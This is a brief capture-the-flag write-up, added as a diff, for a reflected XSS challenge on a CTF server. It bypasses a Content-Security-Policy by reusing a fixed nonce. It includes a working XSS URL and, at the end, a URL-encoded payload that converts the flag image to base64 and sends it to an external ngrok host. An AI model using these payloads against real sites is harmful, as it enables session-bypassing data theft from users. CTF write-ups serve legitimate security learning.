@@ -1,0 +1,30 @@
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; img-src 'self'; script-src 'nonce-<?php echo $nonce ?>';">
+
+Luckily, nonce is a fix value !!!
+
+XSS
+```
+http://35.224.135.84:3200/?name=<script nonce="70861e83ad7f1863b3020799df93e450">alert(1)</script>
+```
+
+Cookie is HTTP only, cannot exfiltrate
+
+The flag is in image format
+=> Use payload.js to get base64 format image
+
+python3 exp.py
+```
+flag_in_base64
+```
+
+Use CyberChef to decode => Get flag
+
+
+========= Other Payload =========
+
+payload2.js
+
+payload3.js
+```
+http://35.224.135.84:3200/?name=%3Cscript%20nonce=70861e83ad7f1863b3020799df93e450%3Efunction%20getBase64Image(e){var%20a=document.createElement(%22canvas%22);return%20a.width=e.width,a.height=e.height,a.getContext(%222d%22).drawImage(e,0,0),a.toDataURL(%22image/png%22).replace(/^data:image\/(png|jpg);base64,/,%22%22)};flag.onload=()=%3E{location=%27http://d708c4df6f39.ngrok.io?data=%27%2BencodeURIComponent(getBase64Image(flag))}%3C/script%3E
+```
